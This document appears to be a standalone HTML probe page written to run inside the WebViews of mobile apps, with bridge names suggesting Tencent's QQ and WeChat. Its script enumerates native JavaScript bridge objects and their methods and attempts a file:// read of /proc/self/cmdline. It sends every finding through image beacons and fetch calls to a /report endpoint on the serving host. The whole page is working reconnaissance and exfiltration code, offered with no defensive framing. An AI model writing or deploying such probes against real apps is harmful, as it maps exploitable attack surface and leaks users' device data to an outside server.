<!DOCTYPE html><html><head><meta charset="utf-8"><title>QQBRIDGEPROBE</title></head><body>
<h3 id="st">probing...</h3>
<script>
var FOUND = {};
function rep(tag, data) {
  try { new Image().src = '/report?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data)).slice(0, 3000); } catch(e) {}
  try { fetch('/report?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data)).slice(0, 3000)); } catch(e) {}
}
rep('loaded', location.href + ' | ua=' + navigator.userAgent.slice(0,120));

// 1) 枚举 window 上的可疑 bridge 对象
var keys = Object.getOwnPropertyNames(window);
var suspects = [];
for (var i = 0; i < keys.length; i++) {
  var k = keys[i];
  if (/bridge|Bridge|jsApi|JsApi|mqq|qimei|webso|Weixin|hippy|dt|tbs|qb|_mqq|interface|Interface|jsbridge/i.test(k)) {
    try { suspects.push(k + ':' + typeof window[k]); } catch(e) {}
  }
}
rep('window_suspects', suspects.join('|') || 'NONE');

// 2) 已知 bridge 名清单逐一探测
var known = ['_mqqWebViewJSInterface','_webso','qimeiBridge','dtBridge','DTJsBridgeInterface',
  'WeixinJSCore','QQJSCore','hippy','webbundle','docsPreview','docs','local_obj','ECommerceJSBridge',
  'TenvideoJSBridge','QQLiveJavaInterface','appApi','jsApi','JsBridge','NativeApp','_AppInterface'];
var hits = [];
for (var j = 0; j < known.length; j++) {
  try { if (window[known[j]] !== undefined) {
    var t = typeof window[known[j]];
    var meth = [];
    try { meth = Object.keys(window[known[j]]).slice(0, 20); } catch(e) { meth = ['<nokeys:' + e.message + '>']; }
    hits.push(known[j] + '=' + t + '(' + meth.join(',') + ')');
  } } catch(e) {}
}
rep('known_bridges', hits.join(' || ') || 'NONE');

// 3) 尝试调用 _mqqWebViewJSInterface.invoke 的存在性探测（不真正调敏感方法）
try {
  if (window._mqqWebViewJSInterface) {
    rep('mqq_iface', 'present, keys=' + Object.getOwnPropertyNames(window._mqqWebViewJSInterface).join(','));
  }
} catch(e) { rep('mqq_iface_err', e.message); }

// 4) file:// 读探测（若容器有 universal access）
try {
  fetch('file:///proc/self/cmdline').then(function(r){ return r.text(); }).then(function(t){
    rep('file_read_cmdline', t.slice(0, 200));
  }).catch(function(e){ rep('file_read_cmdline_err', e.message); });
} catch(e) { rep('file_read_err', String(e)); }

setTimeout(function(){ document.getElementById('st').textContent = 'DONE_KEYS=' + suspects.length + '_HITS=' + hits.length; }, 800);
</script></body></html>
